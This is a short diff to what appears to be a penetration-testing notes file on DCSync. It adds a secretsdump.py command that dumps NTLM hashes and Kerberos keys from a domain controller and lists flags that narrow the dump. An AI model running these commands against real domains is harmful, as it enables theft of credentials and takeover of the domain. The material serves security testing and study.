@@ -118,7 +118,9 @@ This will then show us all the replication permissions for that user. We are loo
 ### Using secretsdump.py
 ```bash
 secretsdump.py -outputfile hashes -just-dc [domain]/[user]@[dc-ip]
+secretsdump.py -just-dc [domain]/[user]@[dc-fqdn] -target-ip [dc-ip]
 ```
+> These are additional flags that can be given
 > `-just-dc-ntlm` will give us only NTLM hashes, as opposed to also giving kerberos keys too
 > `-just-dc-user` will only give data on a specific user
 > `-pwd-last-set` will show when each account last reset its password
